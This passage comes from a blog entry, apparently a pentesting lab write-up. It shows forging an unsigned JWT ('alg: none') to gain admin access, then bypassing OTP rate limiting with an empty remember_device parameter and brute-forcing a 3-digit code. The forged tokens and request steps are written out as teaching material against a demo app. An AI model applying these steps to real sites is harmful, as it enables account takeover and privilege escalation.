<p>Open up Burp Suite and log in with the test creds. Go to <strong>HTTP History</strong> and look for a request to <code class="language-plaintext highlighter-rouge">/dashboard</code>. Burp will pick up a <strong>JWT token</strong> automatically thanks to the <strong>JWT Editor extension</strong>.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UrjP-YDxQ4gFtzScH63b1A.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>You’ll see something like this in the Cookie header:</p>

<p><code class="language-plaintext highlighter-rouge">eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJ1c2VybmFtZSI6ICJ1c2VyIiwgInJvbGUiOiAidXNlciJ9.</code></p>

<p>Decode it, and you’ll find:</p>

<h4 id="header">Header:</h4>

<p><code class="language-plaintext highlighter-rouge">{
  "alg": "none",
  "typ": "JWT"
}</code></p>

<h4 id="payload">Payload:</h4>

<p><code class="language-plaintext highlighter-rouge">{
  "username": "user",
  "role": "user"
}</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KhzbFs9DxmzL-H0G5BrCeQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><strong>Red flag spotted</strong>: <code class="language-plaintext highlighter-rouge">alg: none</code>. This means <strong>the server isn’t verifying the JWT’s signature</strong>. We can forge our own token. Let’s do it.</p>

<hr />

<h3 id="exploitation-become-admin">Exploitation: Become Admin</h3>

<p>Change the <code class="language-plaintext highlighter-rouge">role</code> in the JWT payload to <code class="language-plaintext highlighter-rouge">"admin"</code>:</p>

<h4 id="new-payload">New Payload:</h4>

<p><code class="language-plaintext highlighter-rouge">{
  "username": "user",
  "role": "admin"
}</code></p>

<p>Re-encode the JWT without a signature (keep <code class="language-plaintext highlighter-rouge">alg: none</code>) and replace the token in your browser using a cookie editor or Burp Repeater.</p>

<p>Your forged token might look like:</p>

<p><code class="language-plaintext highlighter-rouge">ewogICAgImFsZyI6ICJub25lIiwKICAgICJ0eXAiOiAiSldUIgp9.ewogICAgInVzZXJuYW1lIjogInVzZXIiLAogICAgInJvbGUiOiAiYWRtaW4iCn0.</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QW9Cs7m0Y6XgUPtNTNDEoQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*edjdPXM-FuP3BI_BHLzgYA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Go back to <code class="language-plaintext highlighter-rouge">/admin</code>, refresh the page <strong>boom</strong>, you’re in.</p>

<p><code class="language-plaintext highlighter-rouge">Admin Panel
🚩 FLAG: FLAG{jwt_admin_escalation_success}</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fCgQwZO6HITkVta0FpxCqw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<hr />

<h3 id="why-this-matters">Why This Matters</h3>

<p>This is a <strong>real-world vulnerability</strong>. A lot of devs incorrectly implement JWTs and allow <code class="language-plaintext highlighter-rouge">alg: none</code>, thinking the payload is safe. But if you don’t validate the signature, you’re literally letting anyone forge roles, identities full takeover.</p>

<h1 id="bypassing-2fa-how-i-sneaked-past-otp-with-a-simple-bug">Bypassing 2FA: How I Sneaked Past OTP with a Simple Bug</h1>

<p>Alright, so imagine this: we already cracked the admin password classic <code class="language-plaintext highlighter-rouge">admin:adminpass</code>.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HwUdnPXEPW-_bxHCdXidVA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>But boom! There’s a 2FA in place, and it’s asking for an OTP code. For this demo, I simplified it to a 3-digit OTP just to keep things chill. I’m running a Python debug script that simulates the OTP being sent to the admin’s email, so I can spy on the code before it hits their inbox.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*w_ro61zOgMbORiaL6yI4xA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Next up, the login page asks for the OTP and gives you an option: “Remember this device,” so next time, no OTP hassle.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Jh3JHVEJhQ14gCUI2PnulA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Now, after some failed OTP tries, it says:</p>

<blockquote>
  <p><em>Too many OTP attempts. Try again in 60 seconds.</em></p>
</blockquote>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4yi2-LvuS57rgIEgml0tdQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; width: 720px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gFQnUcTaObZnnwPWZWTloA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; width: 720px; cursor: zoom-in;" /></p>

<p>Classic rate limiting. But let’s peek <strong>under the hood</strong> using Burp Suite to see what’s really going on with the requests.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SI2corcFafrlQTjdat0KQg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Notice the parameter:
<code class="language-plaintext highlighter-rouge">remember_device=on</code>
This tells the server to remember your device and skip OTP in the future.</p>

<p>Here’s the trick: what if we send the param but empty? Like:
<code class="language-plaintext highlighter-rouge">remember_device=</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5yfbJfSb4kBcy2sXXGRozA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>When I do that, no more rate limiting. The server isn’t blocking attempts anymore.</p>

<p>On the debug side, the OTP code is logged like this:
<code class="language-plaintext highlighter-rouge">[DEBUG] OTP for admin: 382</code></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DQHX-P2rOIJZIcJUhnr5Xg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Since it’s only 3 digits, I scripted a quick brute force from <code class="language-plaintext highlighter-rouge">300</code> to <code class="language-plaintext highlighter-rouge">400</code> keeping it tight to avoid long waits.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1ECdU6AugWZTFZMeN8mc0Q.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ThZXqJ_0WFZS1AI5mUFXFw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>With this, I eventually hit the right OTP: <code class="language-plaintext highlighter-rouge">382</code>. After the correct OTP, the session key updates, and now I’m fully logged in.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3Y-w2el4BZWa-lHAQ1Jzbg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<hr />

<h3 id="why-this-matters-1">Why this matters:</h3>

<ul>
  <li><strong>Rate limiting bypass</strong>: The bug with <code class="language-plaintext highlighter-rouge">remember_device</code> lets us spam OTP attempts without waiting.</li>
</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><summary type="html"><![CDATA[]]></summary></entry></feed>